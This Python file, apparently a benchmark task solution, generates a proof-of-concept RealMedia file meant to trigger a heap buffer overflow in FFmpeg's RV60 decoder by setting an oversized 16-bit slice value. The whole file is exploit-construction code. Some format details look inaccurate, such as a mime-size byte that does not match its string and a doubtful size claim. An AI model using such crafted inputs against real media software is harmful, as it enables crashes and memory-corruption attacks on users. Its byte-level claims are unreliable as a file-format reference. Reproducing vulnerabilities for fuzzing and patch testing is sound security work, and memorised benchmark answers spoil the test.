import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for oss-fuzz:385170375 in the FFmpeg RV60 decoder.

        The vulnerability is a heap buffer overflow in `rv60_decode_slice` caused
        by calculating a `slice_size` from a 16-bit value in the bitstream without
        proper validation. A large value (0xFFFF) results in an oversized
        `slice_size`, leading to out-of-bounds reads in the slice decoding loop.

        The PoC is a minimal RealMedia (.rm) file with a crafted video packet
        that triggers this condition.
        """
        
        # .RMF file header (12 bytes): Signature, version, num_headers=1 (MDPR)
        poc = b'.RMF' + struct.pack('>LL', 0, 1)

        # Type-specific data for the RV60 codec. This has a mixed-endian format.
        type_specific_data = (
            struct.pack('<L', 16) +      # Sub-header size (Little-Endian)
            b'RV60' * 2 +                # FourCCs for RV60
            struct.pack('>HH', 16, 16)   # Width, Height (Big-Endian)
        )

        # MDPR (Media Properties) chunk payload.
        # This defines the stream as RV60 video.
        mdpr_payload = (
            struct.pack('>HH', 0, 1) +      # Object version, Stream number
            b'\x00' * 28 +                  # Zeroed-out fields (rates, sizes, etc.)
            b'\x16' +                       # Mime type size (22 for "video/x-pn-realvideo\0")
            b'video/x-pn-realvideo\0' +     # Mime type
            struct.pack('>L', len(type_specific_data)) + # Length of type-specific data
            type_specific_data
        )
        
        # Assemble the full MDPR chunk (ID + size + payload).
        poc += b'MDPR' + struct.pack('>L', 8 + len(mdpr_payload)) + mdpr_payload

        # The malicious video bitstream payload (3 bytes).
        # - 1 byte (0x00) to satisfy the picture header parsing in rv60_decode_frame.
        # - 2 bytes (0xFFFF) to be read by rv60_decode_slice, causing the huge
        #   slice_size calculation and subsequent buffer overflow.
        video_payload = b'\x00\xff\xff'

        # RM Packet Header (12 bytes).
        packet_header_size = 12
        packet_len = packet_header_size + len(video_payload)
        packet_header = (
            struct.pack('>HH', 0, packet_len) + # Object version, Packet length
            struct.pack('>HL', 1, 0) +          # Stream number, Timestamp
            struct.pack('BB', 0, 2)             # Packet group, Flags (2=keyframe)
        )
        
        full_packet = packet_header + video_payload

        # DATA chunk header (18 bytes) followed by the single packet.
        data_header_size = 18
        data_chunk_size = data_header_size + len(full_packet)
        data_chunk_header = (
            b'DATA' +
            struct.pack('>L', data_chunk_size) +
            struct.pack('>HLL', 0, 1, 0) # Obj ver, Num packets, Next DATA offset
        )

        poc += data_chunk_header + full_packet
        
        # Total PoC size: 128 bytes.
        return poc